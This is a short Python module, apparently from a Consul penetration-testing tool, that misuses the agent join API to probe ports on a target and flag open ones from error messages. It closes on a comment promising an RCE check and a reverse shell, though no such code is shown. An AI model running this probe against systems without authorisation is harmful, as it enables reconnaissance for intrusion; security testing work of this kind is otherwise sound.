import consul
import requests
from consul import ConsulException
from dcms.logger import rootLogger

def check_ssrf(target):

    rootLogger.info("Testing Consul for SSRF \n")
    con = consul.Consul(target)

    ports_to_check = [21,22,80,8000,8600] #Add your list of ports to check for
    check_errors = ["i/o timeout","invalid msgType"]

    for port in ports_to_check:

        try:
            con.agent.join(target+":"+str(port))
        except ConsulException as err:
            for error in check_errors:
                if error in err.__str__():
                    rootLogger.info("Open Port "+str(port)+" found")


#Checks for RCE and if you are lucky gets you a reverse shell
